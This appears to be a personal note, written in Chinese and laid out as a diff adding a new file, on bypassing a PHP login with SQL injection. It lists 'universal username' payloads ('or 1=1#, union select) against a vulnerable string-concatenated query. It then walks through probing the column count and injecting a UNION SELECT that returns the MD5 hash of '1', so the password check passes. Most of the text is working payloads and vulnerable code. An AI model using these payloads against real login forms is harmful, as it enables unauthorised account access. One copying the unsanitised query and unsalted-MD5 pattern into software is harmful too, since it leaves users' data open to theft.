@@ -1,0 +1,43 @@
+$sql = "select usernm,passwd from users where usernm = '$usernm' and passwd = '$passwd'";
+
+万能用户名：
+'or  1=1#
+'xor 1=1#
+'or 1=1-- 
+'xor 1=1-- 
+'union select * from users--
+
+登录代码:
+$usernm = $_POST['usernm'];   
+$passwd = md5($_POST['passwd']);  
+$sql = "select * from users where usernm = '$usernm'";
+$res = mysql_query($sql); 
+$row = mysql_fetch_assoc($res); 
+if($row[passwd] == $passwd){
+  echo "<script>alert('login successfully')</script>";
+}else{
+  echo "Login Failed";
+}
+
+
+注入思路：
+如果直接使用 ' or 1=1 #  				虽然$sql变量查询后返回为真，但是内容是空的，所以后面的条件判断失败
+使用联合查询 ' union select * from users #  		虽然$sql变量查询可以返回账号密码，但是密码不知道一样登录不进去
+
+所以需要自己来决定返回的内容，因此也需要暴力拆解表的长度比如：
+
+' union select 1,1 from users#			这样$sql变量查询后就可以返回值 1 如果有报错说明union联合长度不一致，添加即可
+' union select 1,1,1 from users #		假如users表字段长度就是3，那么返回正确，在账号表单上输入此句即可
+
+表单的账号填写完成后，还需要密码来使得if语句成立，所以在密码框上也输入1，如果密码没有经过加密处理，那么是应该可以登录成功了
+
+如果密码经过md5加密，也就是说表单的密码输入1，但是经过md5加密后 $passwd变量为c4ca4238a0b923820dcc509a6f75849b
+
+因此也需要在表单的账号上也输入这一长串c4ca4238a0b923820dcc509a6f75849b，这一长串可以通过写个php脚本用md5加密显示复制即可
+
+另外需要注意的是md5加密的长串数据需要用引号围起来，不然数据库查询时会报错，也就是万能用户名为：
+
+' union select 'c4ca4238a0b923820dcc509a6f75849b','c4ca4238a0b923820dcc509a6f75849b','c4ca4238a0b923820dcc509a6f75849b'from  users #
+
+如果觉得太长，可以改成：
+' union select 1,'c4ca4238a0b923820dcc509a6f75849b',1 from users #             --当然还得需要知道密码在表的字段在第二个位置
